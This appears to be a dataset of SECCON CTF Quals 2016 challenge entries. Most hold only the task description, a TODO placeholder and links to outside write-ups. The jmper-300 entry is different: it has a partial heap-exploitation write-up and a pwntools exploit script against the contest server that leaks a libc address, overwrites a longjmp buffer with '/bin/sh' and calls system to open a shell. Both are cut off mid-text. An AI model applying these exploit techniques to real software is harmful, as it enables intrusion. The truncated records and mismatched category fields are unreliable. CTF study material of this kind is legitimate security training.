{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\binary\\lost-decryption-200", "year": "2016", "name": "lost-decryption-200", "writeup": "# SECCON CTF Quals 2016 : lost-decryption-200\n\n**Category:** Binary\n**Points:** 200\n**Solves:** 19\n**Description:**\n\nI created my own cipher and encrypted the very important file.\nHowever, I lost the decryption program because of file system error, so now I cannot read the file.\nPlease help me.\n[lost_decryption.zip](lost_decryption.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/Inndy/ctf-writeup/tree/master/2016-seccon/lost_decryption\n* http://van.prooyen.com/reversing/cryptography/2016/12/11/Lost-Decryption-Writeup.html\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\binary\\microcomputer-500", "year": "2016", "name": "microcomputer-500", "writeup": "# SECCON CTF Quals 2016 : microcomputer-500\n\n**Category:** Binary\n**Points:** 500\n**Solves:** 13\n**Description:**\n\nRemote debugging of a micro computer.\nThe server is running on GDB simulator with special patch.\n\n* Connect to the server.\n     \n    $ telnet micro.pwn.seccon.jp 10000\n    $ echo '+$g#67+' | nc micro.pwn.seccon.jp 10000\n    \n    A long connection is disconnected automatically.\n     \n* Read \"flag.txt\" on current directory.\n\nReference:\n\n* Assembly samples for many architectures\n     \n cross-20130826.zip\n ref: <http://kozos.jp/books/asm/cross-20130826.zip>\n     \n See the assembly samples.\n     \n    $ unzip cross-20130826.zip\n    $ cd cross/sample\n    $ ls *.d\n\n See the sample programs running on GDB simulator.\n\n    $ cd cross/exec\n    $ ls *.d\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/q3k/ctf/tree/master/SECCON2016Quals/microcomputer\n"}
{"source": "write-ups-2016", "category": "AES", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\binary\\obfuscated-aes-500", "year": "2016", "name": "obfuscated-aes-500", "writeup": "# SECCON CTF Quals 2016 : obfuscated-aes-500\n\n**Category:** Binary\n**Points:** 500\n**Solves:** 1\n**Description:**\n\nDecrypt it.\n[OAES.zip](OAES.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://www.repo.kr/2016/12/seccon-2016-online-ctf-binarycrypto500_13.html\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\binary\\retrospective-200", "year": "2016", "name": "retrospective-200", "writeup": "# SECCON CTF Quals 2016 : retrospective-200\n\n**Category:** Binary\n**Points:** 200\n**Solves:** 26\n**Description:**\n\nReverse it.\n[file](file)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/Inndy/ctf-writeup/tree/master/2016-seccon/retrospectiv\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\binary\\ropsynth-400", "year": "2016", "name": "ropsynth-400", "writeup": "# SECCON CTF Quals 2016 : ropsynth-400\n\n**Category:** Binary\n**Points:** 400\n**Solves:** 34\n**Description:**\n\nropsynth.pwn.seccon.jp:10000\nRead \"secret\" and output the content such as the following code.\n\n    ==\n    fd = open(\"secret\", 0, 0);\n    len = read(fd, buf, 256);\n    write(1, buf, len);\n    ==\n\n[dist.tgz](dist.tgz)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://tasteless.eu/post/2016/12/seccon-ropsynth/\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\crypto\\alphacomplex1-300", "year": "2016", "name": "alphacomplex1-300", "writeup": "# SECCON CTF Quals 2016 : alphacomplex1-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:** 4\n**Description:**\n\nDecrypt ac1.pwn.seccon.jp:31337\n\n[AlphaComplex1.zip](AlphaComplex1.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\crypto\\alphacomplex2-500", "year": "2016", "name": "alphacomplex2-500", "writeup": "# SECCON CTF Quals 2016 : alphacomplex2-500\n\n**Category:** Crypto\n**Points:** 500\n**Solves:** 1\n**Description:**\n\nDecrypt the cipher.\n\n[AlphaComplex2.zip](AlphaComplex2.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\crypto\\backpackers-capricious-cipher-200", "year": "2016", "name": "backpackers-capricious-cipher-200", "writeup": "# SECCON CTF Quals 2016 : backpackers-capricious-cipher-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** 17\n**Description:**\n\nToday's cipher is here.\n\n[capricious_cipher.zip](capricious_cipher.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\crypto\\png-over-telegraph-300", "year": "2016", "name": "png-over-telegraph-300", "writeup": "# SECCON CTF Quals 2016 : png-over-telegraph-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:** 14\n**Description:**\n\nAnalyze signal in this video.\nYou will able to get PNG, if you success to decode it.\n<https://youtu.be/Y6voaURtKlM>\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\crypto\\vigenere-100", "year": "2016", "name": "vigenere-100", "writeup": "# SECCON CTF Quals 2016 : vigenere-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** 777\n**Description:**\n\n    k: ????????????\n    p: SECCON{???????????????????????????????????}\n    c: LMIG}RPEDOEEWKJIQIWKJWMNDTSR}TFVUFWYOCBAJBQ\n    \n    k=key, p=plain, c=cipher, md5(p)=f528a6ab914c1ecf856a1d93103948fe\n    \n     |ABCDEFGHIJKLMNOPQRSTUVWXYZ{}\n    -+----------------------------\n    A|ABCDEFGHIJKLMNOPQRSTUVWXYZ{}\n    B|BCDEFGHIJKLMNOPQRSTUVWXYZ{}A\n    C|CDEFGHIJKLMNOPQRSTUVWXYZ{}AB\n    D|DEFGHIJKLMNOPQRSTUVWXYZ{}ABC\n    E|EFGHIJKLMNOPQRSTUVWXYZ{}ABCD\n    F|FGHIJKLMNOPQRSTUVWXYZ{}ABCDE\n    G|GHIJKLMNOPQRSTUVWXYZ{}ABCDEF\n    H|HIJKLMNOPQRSTUVWXYZ{}ABCDEFG\n    I|IJKLMNOPQRSTUVWXYZ{}ABCDEFGH\n    J|JKLMNOPQRSTUVWXYZ{}ABCDEFGHI\n    K|KLMNOPQRSTUVWXYZ{}ABCDEFGHIJ\n    L|LMNOPQRSTUVWXYZ{}ABCDEFGHIJK\n    M|MNOPQRSTUVWXYZ{}ABCDEFGHIJKL\n    N|NOPQRSTUVWXYZ{}ABCDEFGHIJKLM\n    O|OPQRSTUVWXYZ{}ABCDEFGHIJKLMN\n    P|PQRSTUVWXYZ{}ABCDEFGHIJKLMNO\n    Q|QRSTUVWXYZ{}ABCDEFGHIJKLMNOP\n    R|RSTUVWXYZ{}ABCDEFGHIJKLMNOPQ\n    S|STUVWXYZ{}ABCDEFGHIJKLMNOPQR\n    T|TUVWXYZ{}ABCDEFGHIJKLMNOPQRS\n    U|UVWXYZ{}ABCDEFGHIJKLMNOPQRST\n    V|VWXYZ{}ABCDEFGHIJKLMNOPQRSTU\n    W|WXYZ{}ABCDEFGHIJKLMNOPQRSTUV\n    X|XYZ{}ABCDEFGHIJKLMNOPQRSTUVW\n    Y|YZ{}ABCDEFGHIJKLMNOPQRSTUVWX\n    Z|Z{}ABCDEFGHIJKLMNOPQRSTUVWXY\n    {|{}ABCDEFGHIJKLMNOPQRSTUVWXYZ\n    }|}ABCDEFGHIJKLMNOPQRSTUVWXYZ{\n\nVigenere cipher\nhttps://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://aukezwaan.nl/write-ups/seccon-2016-online-ctf-vigenere-100-points/\n* https://github.com/p4-team/ctf/tree/master/2016-12-10-seccon-2016-quals/vigenere\n* https://github.com/pogTeam/writeups/blob/master/2016/seccon/Vigenere/README.md\n* https://nacayoshi00.wordpress.com/2016/12/12/seccon-2016-online-writeup/\n* https://0xd13a.github.io/ctfs/seccon2016/vigenere\n* https://ctftime.org/writeup/4982\n* https://ctftime.org/writeup/4980\n* https://github.com/Inndy/ctf-writeup/tree/master/2016-seccon/vigenere\n* https://www.youtube.com/watch?v=OJ65pbaG84M\n* https://j-kruse.de/2016/12/11/100-vigenere/\n* https://github.com/pr0v3rbs/CTF/blob/master/2016/SECCON/Vigenere/decode.py\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\exploit\\chat-500", "year": "2016", "name": "chat-500", "writeup": "# SECCON CTF Quals 2016 : chat-500\n\n**Category:** Exploit\n**Points:** 500\n**Solves:** 35\n**Description:**\n\nHost : chat.pwn.seccon.jp\nPort : 26895\n\n[chat](chat) (SHA1 : 6a60392ff43764570a1ea32de00ac6124469af0c)\n[libc-2.19.so](libc-2.19.so) (SHA1 : 8674307c6c294e2f710def8c57925a50e60ee69e)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://bruce30262.logdown.com/posts/1200645-seccon-ctf-2016-chat\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\exploit\\checker-300", "year": "2016", "name": "checker-300", "writeup": "# SECCON CTF Quals 2016 : checker-300\n\n**Category:** Exploit\n**Points:** 300\n**Solves:** 75\n**Description:**\n\nHost : checker.pwn.seccon.jp\nPort : 14726\n\n[checker](checker) (SHA1 : 576202ccac9c1c84d3cf6c2ed0ec4d44a042f8ef)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://bannsecurity.com/index.php/home/10-ctf-writeups/39-seccon-2016-checker\n* https://github.com/Inndy/ctf-writeup/tree/master/2016-seccon/checker\n* https://github.com/0x90r00t/Write-Ups/blob/master/Seccon/checker/solve.py\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\exploit\\cheer-msg-100", "year": "2016", "name": "cheer-msg-100", "writeup": "# SECCON CTF Quals 2016 : cheer-msg-100\n\n**Category:** Exploit\n**Points:** 100\n**Solves:** 115\n**Description:**\n\nHost : cheermsg.pwn.seccon.jp\nPort : 30527\n\n[cheer_msg](cheer_msg) (SHA1 : a89bdbaf3a918b589e14446f88d51b2c63cb219f)\n[libc-2.19.so](libc-2.19.so) (SHA1 : c4dc1270c1449536ab2efbbe7053231f1a776368)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://www.hamidx9.ir/solutions/2016/seccon/cheer_msg/rsol.py\n* https://github.com/Inndy/ctf-writeup/tree/master/2016-seccon/cheer_msg\n* https://github.com/0x90r00t/Write-Ups/tree/master/Seccon/cheer_msg\n* https://github.com/DaramG/ctf-writeup/tree/master/2016_seccon/chee\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\exploit\\jmper-300", "year": "2016", "name": "jmper-300", "writeup": "# SECCON CTF Quals 2016 : jmper-300\n\n**Category:** Exploit\n**Points:** 300\n**Solves:** 72\n**Description:**\n\nHost : jmper.pwn.seccon.jp\nPort : 5656\n\n[jmper](jmper) (SHA1 :78e21967c2de5988876df938559a850e24a000af)\n[libc-2.19.so](libc-2.19.so) (SHA1 :8674307c6c294e2f710def8c57925a50e60ee69e)\n\n## Write-up\n\nFor this challenge we were given a binary called jmper and the corresponding libc.\nI started off by analysing the binary with radare, which I don't describe in detail her,\nbut I give you c/pseudocode snippets of the import parts.\n\nThe binary's main function basically does this:\n\n    int main(int argc, char argv) {\n        int ret;\n        puts(\"Welcome to my class.\"):\n        puts(\"My class is up to 30 people :)\");\n        myclass = malloc(sizeof(struct myclass));\n        jmpbuf = malloc(sizof(struct jmpbuf));\n        ret = setjmp(jmpbuf);\n        if (ret) {\n           mainLoop();\n        } else {\n           puts(\"Nice jump! Bye\");\n        }\n        return 0;\n    }\n\nNote that it sets a longjump by calling `setjmp`, where the `longjmp struct` is allocated on the heap.\nA longjump is basically a cross-function goto, so whenever you call `longjmp` with the particular\n`jmpbuf` you will again return from the `setjmp` call, and the return value indicates that a jump has occured.\n\nFor the myclass chunk, the following struct is used, which stores pointers to all the students.\n\n    struct class {\n        struct stud students[0x1e];\n    }\n\nThe `mainLoop`, which is called afterwards, has 6 options:\n\n     1. Add student.\n     2. Name student.\n     3. Write memo\n     4. Show Name\n     5. Show memo.\n     6. Bye :)\n\nLet's see what happens when we add a student, the code looks like this:\n\n    if (studen_num > 0x1d) {\n        puts(\"Exception has occurred. Jump!\");\n        longjmp(jmpbuf);\n    }\n    struct stud *stud_tmp = malloc(sizeof(struct stud));\n    stud_tmp->name = malloc(0x20);\n    myclass->students[stud_num] = stud_tmp;\n    stud_num++;\n\n\nThe `stud struct` that is created when a student is added looks like this:\n\n    struct stud {\n        uint8_t id;\n        char memo_buf[0x20];\n        char *name;\n    }\n\nInterestingly when you arrive at the maximum number of students, the `longjmp` is triggered\nwhich jumps back to the end of the main function. Remember that the longjump buffer\nis stored on the heap, as is a student struct and it's name struct.\nThe `longjmp struct` looks like this:\n\n    struct jmpbuf {\n        uint64_t rbx;\n        uint64_t rbp;\n        uint64_t r12;\n        uint64_t r13;\n        uint64_t r14;\n        uint64_t r15;\n        uint64_t rsp;\n        uint64_t rip;\n    }\n\nThe actual function operates like this:\n\n    <__longjmp>:          mov    r8,QWORD PTR [rdi+0x30]\n    <__longjmp+4>:        mov    r9,QWORD PTR [rdi+0x8]\n    <__longjmp+8>:        mov    rdx,QWORD PTR [rdi+0x38]\n    <__longjmp+12>:       ror    r8,0x11\n    <__longjmp+16>:       xor    r8,QWORD PTR [rip+0x209ad9]\n    <__longjmp+23>:       ror    r9,0x11\n    <__longjmp+27>:       xor", "solution_code": "\n# jmper_exploit.py\n#!/usr/bin/env python2\n\n#  system exploit for the jmper binary of Seccon Quals 2016\n#  written by mightymo\n#  based on pwntools:\n#  docu: https://docs.pwntools.com/en/stable/\n#  repo: https://github.com/Gallopsled/pwntools\n#  install: pip install --upgrade pwntools\n\nfrom pwn import *\nimport re\nimport sys\nimport fcntl\nimport os\nfrom hexdump import hexdump\n\nSTUDS = 0\n\n# Set context for asm\ncontext.clear()\ncontext(os='linux', arch='amd64', log_level='INFO', bits=64)\n\ne = ELF('./jmper')\nlibc = ELF('./libc-2.19.so')\n\n# Set host and port\nH,P='jmper.pwn.seccon.jp',5656\n\n#p = process(\"./jmper\")\np = remote(H,P)\n#print \"PID: {}\".format(util.proc.pidof(p))\n#pause()\n\n# rol and rol lambda functions for jmpbuf en-/decryption\nrol = lambda val, r_bits, max_bits: \\\n    (val << r_bits%max_bits) & (2**max_bits-1) | \\\n    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))\n\nror = lambda val, r_bits, max_bits: \\\n    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \\\n    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))\n\ndef read_menu(sock):\n    return sock.recvuntil('Bye :)')\n\ndef create_stud(sock):\n    global STUDS\n    sock.sendline('1')\n    read_menu(sock)\n    ret = STUDS\n    STUDS += 1\n    return ret\n\ndef write_name(sock, stud_id, name):\n    sock.sendline('2')\n    sock.recvuntil(\"ID:\")\n    sock.sendline(\"{}\".format(stud_id))\n    sock.recvuntil(\"name:\")\n    sock.sendline(name)\n    read_menu(sock)\n\ndef write_memo(sock, stud_id, memo):\n    sock.sendline('3')\n    sock.recvuntil(\"ID:\")\n    sock.sendline(\"{}\".format(stud_id))\n    sock.recvuntil(\"memo:\")\n    sock.sendline(memo)\n    read_menu(sock)\n\ndef show_name(sock, stud_id):\n    sock.sendline('4')\n    sock.recvuntil(\"ID:\")\n    sock.sendline(\"{}\".format(stud_id))\n    ret = sock.recvline()\n    read_menu(sock)\n    return ret\n\ndef show_memo(sock, stud_id):\n    sock.sendline('5')\n    sock.recvuntil(\"ID:\")\n    sock.sendline(\"{}\".format(stud_id))\n    ret = sock.recvline()\n    read_menu(sock)\n    return ret\n\ndef longjump(sock):\n    while create_stud(sock) != 0x1d:\n        pass\n    sock.sendline('1')\n\noffset_my_class = 0x010\noffset_jmpbuf = 0x110\noffset_stud1 = 0x1e0\noffset_stud2 = 0x250\noffset_stud3 = 0x2c0\noffset_stud4 = 0x330\noffset_stud5 = 0x3a0\noffset_name1 = 0x220\noffset_name2 = 0x290\noffset_name3 = 0x300\noffset_name4 = 0x370\noffset_name5 = 0x3e0\n\n\n# gadegts\npop_ret = 0x0000000000400661 # ret\n\nread_menu(p)\nstud_1 = create_stud(p)\nlog.info(\"Created stud {}\".format(stud_1))\nstud_2 = create_stud(p)\nlog.info(\"Created stud {}\".format(stud_2))\nstud_3 = create_stud(p)\nlog.info(\"Created stud {}\".format(stud_3))\nstud_4 = create_stud(p)\nlog.info(\"Created stud {}\".format(stud_4))\nstud_5 = create_stud(p)\nlog.info(\"Created stud {}\".format(stud_5))\nwrite_name(p, stud_1, \"alice\")\nwrite_name(p, stud_2, \"bob\")\nwrite_name(p, stud_3, \"carol\")\nwrite_memo(p, stud_2, \"A\"*0x20+\"\\xe8\") # stud2 points to stud_3->name \nwrite_name(p, stud_2, \"A\")\ndump = show_name(p, stud_2)\njmpbuf_lsw = ((ord(dump[1]) & 0xf0) << 8) | 0x110\nlog.info(\"Found jumpbuf offset: {0:x}\".format(jmpbuf_lsw))\n\n\nlog.info(\"Get secret xor word\")\nrip_addr = jmpbuf_lsw+0x38\nwrite_name(p, stud_2, p16(rip_addr))\ndump = show_name(p, stud_3)\nrip_stored = unpack(dump[:8])\nlog.info(\"Found stored rip: {0:x}\".format(rip_stored))\nrip = ror(rip_stored, 0x11, 64)\nsecret_xor = rip ^ 0x400c31\nlog.info(\"Found secret xor: {0:x}\".format(secret_xor))\n\n\nlog.info(\"Overwrite stored rbx with /bin/sh'\")\nrip_addr = jmpbuf_lsw\nwrite_name(p, stud_2, p16(rip_addr))\nwrite_name(p, stud_3, '/bin/sh')\n#\n# get libc info\nlog.info(\"Overwrite stored rip with system@libc\")\ngetchar_addr = e.got['getchar']\nwrite_name(p, stud_2, p64(getchar_addr))\ndump = show_name(p, stud_3)\nend = dump.index('1')\ngetchar_dump = dump[:end]\ngetchar_addr = u64(getchar_dump + \"\\x00\\x00\")\nlog.info(\"Found getchar @ {0:x}\".format(getchar_addr))\n\nlibc_base = getchar_addr - libc.symbols[\"getchar\"]\nlog.info(\"Found libc_base @ {0:x}\".format(libc_base))\nlibc_system = libc_base + libc.symbols[\"system\"]\nlog.info(\"Found"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\exploit\\logger-300", "year": "2016", "name": "logger-300", "writeup": "# SECCON CTF Quals 2016 : logger-300\n\n**Category:** Exploit\n**Points:** 300\n**Solves:** 18\n**Description:**\n\nHost : logger.pwn.seccon.jp\nPort : 6565\n\n[logger](logger) (SHA1 : fee7140cb33d79c0406de49f7f8985fd459468ea)\n[libc-2.19.so](libc-2.19.so) (SHA1 : 8674307c6c294e2f710def8c57925a50e60ee69e)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/Pistachiology/CTF-writeups-public/blob/master/seccon2016/loggy.py\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\exploit\\mboard-500", "year": "2016", "name": "mboard-500", "writeup": "# SECCON CTF Quals 2016 : chat-500\n\n**Category:** Exploit\n**Points:** 500\n**Solves:** 3\n**Description:**\n\nHost : mboard.pwn.seccon.jp\nPort : 8273\nExecute command : ./mvees_sandbox --replicas=1 --level=2 --out-limit=8192 --deny=11 ./mboard 2>&1\n[mboard.zip](mboard.zip)\nmboard (SHA1 : cbd1701364cd7a41208cf4fd3cd5e82269f65b27)\nmvees_sandbox (SHA1 : 38188bb110a74fb5641a3b51386d73c0d9ab0ed1)\n[libc-2.19.so](libc-2.19.so) (SHA1 : c4dc1270c1449536ab2efbbe7053231f1a776368)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/mehQQ/public_writeup/tree/master/seccon2016\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\exploit\\missle-400", "year": "2016", "name": "missle-400", "writeup": "# SECCON CTF Quals 2016 : missle-400\n\n**Category:** Exploit\n**Points:** 400\n**Solves:** 8\n**Description:**\n\nHost : missile.pwn.seccon.jp\nPort : 9999\n\n[Missile](Missile) (SHA1 : 0bcb9fb57431ca8c459d346d8ede376510da433a)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/DaramG/ctf-writeup/tree/master/2016_seccon/missile\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\exploit\\shopping-400", "year": "2016", "name": "shopping-400", "writeup": "# SECCON CTF Quals 2016 : shopping-400\n\n**Category:** Exploit\n**Points:** 400\n**Solves:** 12\n**Description:**\n\nHost : shopping.pwn.seccon.jp\nPort : 16294\n\n[shopping](shopping) (SHA1 : c2e27cb9cefe7c08b52d5849bf39017cfcd38efb)\n[libc-2.19.so](libc-2.19.so) (SHA1 : 8674307c6c294e2f710def8c57925a50e60ee69e)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/pwn2expoit/ctfwriteups/blob/master/seccon/shop/solve.py\n* https://github.com/DaramG/ctf-writeup/tree/master/2016_seccon/shopping\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\exploit\\tinypad-300", "year": "2016", "name": "tinypad-300", "writeup": "# SECCON CTF Quals 2016 : tinypad-300\n\n**Category:** Exploit\n**Points:** 300\n**Solves:** 18\n**Description:**\n\nHost : tinypad.pwn.seccon.jp\nPort : 57463\n\nHeap Fun as a Service!\n\n[tinypad](tinypad) (SHA1 : 0e6d01f582e5d8f00283f02d2281cc2c661eba72)\n[libc-2.19.so](libc-2.19.so) (SHA1 : 8674307c6c294e2f710def8c57925a50e60ee69e)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://gist.github.com/zzoru/264ca20cca4f615c11191040d5a72179\n* https://github.com/blendin/writeups/tree/master/2016/tinypad\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\forensic\\memory-analysis-100", "year": "2016", "name": "memory-analysis-100", "writeup": "# SECCON CTF Quals 2016 : memory-analysis-100\n\n**Category:** Forensic\n**Points:** 100\n**Solves:** 384\n**Description:**\n\nFind the website that the fake svchost is accessing.\nYou can get the flag if you access the website!!\n\n[memoryanalysis.zip](http://files.quals.seccon.jp/memoryanalysis.zip)\nThe challenge files are huge, please download it first. \nHint1: <http://www.volatilityfoundation.org/>\nHint2: Check the hosts file\n\npassword: fjliejflsjiejlsiejee33cnc \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://www.slideshare.net/sehanlee7/seccon-2016-online-ctf-memory-analysis-writeup-verkorean\n* https://github.com/p4-team/ctf/tree/master/2016-12-10-seccon-2016-quals/memory\n* http://rawsec.ml/en/SECCON-2016-100-forensics-memory-analysis/\n* http://crattack.tistory.com/entry/SECCON2016-Forensic-100-write-up\n* https://nacayoshi00.wordpress.com/2016/12/12/seccon-2016-online-writeup/\n* https://0xd13a.github.io/ctfs/seccon2016/memory-analysis\n* https://github.com/pogTeam/writeups/tree/master/2016/seccon/Memory%20Analysis\n* https://github.com/Yacine101/CTF_SOLUTIONS/blob/master/SECCON_2016_Memory_Analysis.md\n* https://shankaraman.wordpress.com/2016/12/11/seccon-2016-forensics-100-memory-analysis-writeup/\n* http://thu11d3r.blogspot.com/2016/12/seccon-ctf-2016-forensic-100p-memory.html\n* https://blog.nhiroki.net/2016/12/11/seccon-2016-online-ctf-writeup\n* https://ctf.rip/seccon-2016-quals-memory-analysis-forensics-challenge/\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\forensic\\randomware-300", "year": "2016", "name": "randomware-300", "writeup": "# SECCON CTF Quals 2016 : randomware-300\n\n**Category:** Forensic\n**Points:** 300\n**Solves:** 38\n**Description:**\n\nMy PC suddenly got broken. Could you help me to recover it please?\nNOTE: The disk can be virus-infected. DO NOT RUN any programs extracted from the disk outside of sandbox.\n\n[disk.qcow2.zip](http://files.quals.seccon.jp/disk.qcow2.zip)\n\nChallenge files is huge, please download it first. Password will release after 60min.\n\npassword: h9nn4c2955kik9qti9xphuxti\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://gist.github.com/Lense/421d39318745549a0f26aef44541c8ef\n* https://github.com/tothi/ctfs/tree/master/seccon-quals-ctf-2016/randomware\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\forensic\\voip-100", "year": "2016", "name": "voip-100", "writeup": "# SECCON CTF Quals 2016 : voip-100\n\n**Category:** Forensic\n**Points:** 100\n**Solves:** 733\n**Description:**\n\nVoIP\nExtract a voice.\nThe flag format is SECCON{[A-Z0-9]}.\n\n[voip.pcap](voip.pcap)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/p4-team/ctf/tree/master/2016-12-10-seccon-2016-quals/voip\n* https://jbzteam.github.io/ctf/SECCON2016-VoIP\n* https://nacayoshi00.wordpress.com/2016/12/12/seccon-2016-online-writeup/\n* https://0xd13a.github.io/ctfs/seccon2016/voip\n* https://github.com/pogTeam/writeups/tree/master/2016/seccon/voip\n* https://ctftime.org/writeup/4981\n* https://shankaraman.wordpress.com/2016/12/11/seccon-2016-forensics-100-voip-writeup/\n* https://www.youtube.com/watch?v=fdPdzH6vH4k\n* http://thu11d3r.blogspot.com/2016/12/seccon-contest-2016-forensic-100p-voip.html\n* https://blog.nhiroki.net/2016/12/11/seccon-2016-online-ctf-writeup\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\web\\basiq-100", "year": "2016", "name": "basiq-100", "writeup": "# SECCON CTF Quals 2016 : basiq-100\n\n**Category:** Web\n**Points:** 100\n**Solves:** 31\n**Description:**\n\nWhat is admin's password?:-)\n<http://basiq.pwn.seccon.jp>\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/p4-team/ctf/blob/master/2016-12-10-seccon-2016-quals/web_100_basiq/README.md\n* http://n1ghtingale.me/write-ups/2016/12/12/SECCON-2016-Web-100-basiq-writeup.html\n* https://youtu.be/zNVMeLSUepM\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\web\\biscuiti-300", "year": "2016", "name": "biscuiti-300", "writeup": "# SECCON CTF Quals 2016 : biscuiti-300\n\n**Category:** Web\n**Points:** 300\n**Solves:** 16\n**Description:**\n\nCan you login as admin?\n<http://biscuiti.pwn.seccon.jp/>\n[biscuiti.zip](biscuiti.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://crypto.rop.sh/post/2ODE1D5GNUUH\n* https://gist.github.com/sonickun/dba8163394b849f70b968690c02c169b\n\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\web\\pppppoxy-200", "year": "2016", "name": "pppppoxy-200", "writeup": "# SECCON CTF Quals 2016 : pppppoxy-200\n\n**Category:** Web\n**Points:** 200\n**Solves:** 43\n**Description:**\n\nLog in as admin and get the flag\n[pppppoxy.zip](pppppoxy.zip).\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://ctftime.org/writeup/4944\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\web\\uncomfortable-web-300", "year": "2016", "name": "uncomfortable-web-300", "writeup": "# SECCON CTF Quals 2016 : uncomfortable-web-300\n\n**Category:** Web\n**Points:** 300\n**Solves:** 78\n**Description:**\n\nAttack to <http://127.0.0.1:81/authed/> through the uploaded script at <http://uncomfortableweb.pwn.seccon.jp/>.\nGet the flag in the database!\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/p4-team/ctf/blob/master/2016-12-10-seccon-2016-quals/web_300_uncomfortable_web/README.md\n* http://blog.ankursundara.com/seccon-ctf-quals-uncomfortable-web/\n* https://dinhbaoluciusteam.wordpress.com/2016/12/11/seccon-2016-uncomfortable-web-web300/\n"}
